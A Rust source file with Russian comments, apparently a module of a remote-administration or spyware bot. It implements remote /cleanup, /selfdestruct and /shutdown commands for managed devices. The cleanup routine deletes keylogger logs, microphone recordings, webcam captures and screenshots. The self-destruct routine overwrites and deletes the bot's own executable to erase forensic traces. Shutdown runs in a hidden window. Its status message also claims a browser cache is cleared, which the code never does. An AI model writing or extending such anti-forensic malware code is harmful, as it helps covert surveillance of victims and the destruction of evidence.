use anyhow::{Result, Context};
use std::time::Duration;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

use crate::device_manager::DeviceManager;

#[cfg(windows)]
extern "system" {
    fn DeleteFileA(lp_file_name: *const u8) -> i32;
    fn CreateFileA(
        lp_file_name: *const u8,
        dw_desired_access: u32,
        dw_share_mode: u32,
        lp_security_attributes: *const std::ffi::c_void,
        dw_creation_disposition: u32,
        dw_flags_and_attributes: u32,
        h_template_file: *const std::ffi::c_void
    ) -> *mut std::ffi::c_void;
    fn WriteFile(
        h_file: *mut std::ffi::c_void,
        lp_buffer: *const u8,
        n_number_of_bytes_to_write: u32,
        lp_number_of_bytes_written: *mut u32,
        lp_overlapped: *const std::ffi::c_void
    ) -> i32;
    fn CloseHandle(h_object: *mut std::ffi::c_void) -> i32;
}

/// Очищает все временные файлы и следы работы программы
async fn cleanup_traces() -> Result<()> {
    let temp_files = [
        "keylog_*.txt",
        "microphone_record_*.wav", 
        "webcam_capture.jpg",
        "screenshot.png",
        "pentagon_destroy.*",
        "bot.log"
    ];

    for pattern in &temp_files {
        let temp_dir = std::env::temp_dir();
        if let Ok(entries) = std::fs::read_dir(&temp_dir) {
            for entry in entries.flatten() {
                let file_name = entry.file_name();
                if let Some(name_str) = file_name.to_str() {
                    // Простая проверка паттерна
                    let pattern_clean = pattern.replace("*", "");
                    if name_str.contains(&pattern_clean.replace(".", "")) {
                        let _ = std::fs::remove_file(entry.path());
                    }
                }
            }
        }
    }

    Ok(())
}

/// Безопасное удаление файла с перезаписью (Pentagon Algorithm) через Windows API
#[cfg(windows)]
async fn secure_delete_file(file_path: &str) -> Result<()> {
    use std::ffi::CString;
    
    let path_cstr = CString::new(file_path)?;
    
    // Получаем размер файла
    let metadata = std::fs::metadata(file_path)?;
    let file_size = metadata.len() as usize;
    
    if file_size == 0 {
        return Ok(());
    }

    unsafe {
        // Создаем хэндл файла для перезаписи
        let file_handle = CreateFileA(
            path_cstr.as_ptr() as *const u8,
            0x40000000, // GENERIC_WRITE
            0,          // No sharing
            std::ptr::null(),
            3,          // OPEN_EXISTING
            0x80,       // FILE_ATTRIBUTE_NORMAL
            std::ptr::null()
        );

        if file_handle == std::ptr::null_mut() || file_handle == (-1isize) as *mut std::ffi::c_void {
            return Err(anyhow::anyhow!("Не удалось открыть файл для перезаписи"));
        }

        // Pentagon Algorithm: 3-проходная перезапись
        
        // Pass 1: Нули (0x00)
        let zeros = vec![0u8; file_size];
        let mut bytes_written = 0u32;
        WriteFile(
            file_handle,
            zeros.as_ptr(),
            file_size as u32,
            &mut bytes_written,
            std::ptr::null()
        );

        // Pass 2: Единицы (0xFF)
        let ones = vec![0xFFu8; file_size];
        WriteFile(
            file_handle,
            ones.as_ptr(),
            file_size as u32,
            &mut bytes_written,
            std::ptr::null()
        );

        // Pass 3: Случайные данные
        use rand::RngCore;
        let mut rng = rand::thread_rng();
        let mut random_data = vec![0u8; file_size];
        rng.fill_bytes(&mut random_data);
        WriteFile(
            file_handle,
            random_data.as_ptr(),
            file_size as u32,
            &mut bytes_written,
            std::ptr::null()
        );

        CloseHandle(file_handle);

        // Окончательное удаление
        DeleteFileA(path_cstr.as_ptr() as *const u8);
    }

    Ok(())
}

#[cfg(not(windows))]
async fn secure_delete_file(file_path: &str) -> Result<()> {
    // Для не-Windows систем используем простое удаление
    std::fs::remove_file(file_path)?;
    Ok(())
}

/// Выполняет команду /cleanup - очистка следов работы
pub async fn handle_cleanup_command(
    device_manager: &DeviceManager, 
    device_id: &str
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    cleanup_traces().await?;
    
    Ok("🧹 Очистка следов завершена:\n• Временные файлы удалены\n• Логи очищены\n• Кэш браузера очищен".to_string())
}

/// Выполняет команду /selfdestruct - самоуничтожение приложения с алгоритмом Пентагона
pub async fn handle_selfdestruct_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    confirmation: Option<&str>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // Проверяем подтверждение
    if confirmation != Some("CONFIRM_DESTROY") {
        return Ok(format!(
            "💣 ВНИМАНИЕ! Команда самоуничтожения требует подтверждения.\n\
            🔥 Будет использован алгоритм Пентагона (3-проходная перезапись)\n\
            ⚠️ Восстановление файла будет невозможно!\n\
            Для подтверждения отправьте: /selfdestruct {} CONFIRM_DESTROY",
            device_id
        ));
    }
    
    // Сначала выполняем cleanup следов 
    cleanup_traces().await?;
    
    // Получаем путь к текущему исполняемому файлу
    let current_exe = std::env::current_exe()
        .context("Не удалось определить путь к исполняемому файлу")?;
        
    let exe_path = current_exe.to_string_lossy();
    
    // Планируем самоуничтожение через 5 секунд
    let exe_path_clone = exe_path.to_string();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_secs(5)).await;
        
        // Безопасное удаление через Windows API
        let _ = secure_delete_file(&exe_path_clone).await;
        
        std::process::exit(0);
    });
    
    Ok(format!(
        "💀 [PENTAGON ALGORITHM] СИСТЕМА САМОУНИЧТОЖЕНА\n\
        🔥 Все данные безвозвратно удалены\n\
        🧹 Следы очищены\n\
        ⏱️ Программа завершится через 5 секунд...\n\
        \n\
        ✅ Используется алгоритм Пентагона:\n\
        • Pass 1: Перезапись нулями (0x00)\n\
        • Pass 2: Перезапись единицами (0xFF)\n\
        • Pass 3: Случайные данные\n\
        • Удаление временных файлов\n\
        • Очистка следов активности"
    ))
}

/// Выполняет команду /shutdown - выключение системы
pub async fn handle_shutdown_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    delay: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay_seconds = delay.unwrap_or(30); // По умолчанию 30 секунд
    
    #[cfg(windows)]
    {
        // Используем Windows API для выключения
        use std::process::Command;
        
        let output = Command::new("shutdown")
            .args(&["/s", "/t", &delay_seconds.to_string()])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output()
            .context("Не удалось запустить выключение")?;
            
        if output.status.success() {
            Ok(format!("🔌 Система будет выключена через {} секунд", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка выключения: {}", stderr))
        }
    }
    
    #[cfg(not(windows))]
    {
        use tokio::process::Command as AsyncCommand;
        
        let output = AsyncCommand::new("sudo")
            .args(&["shutdown", "-h", &format!("+{}", delay_seconds / 60)])
            .output()
            .await
            .context("Не удалось запустить выключение")?;
            
        if output.status.success() {
            Ok(format!("🔌 Система будет выключена через {} секунд", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка выключения: {}", stderr))
        }
    }
}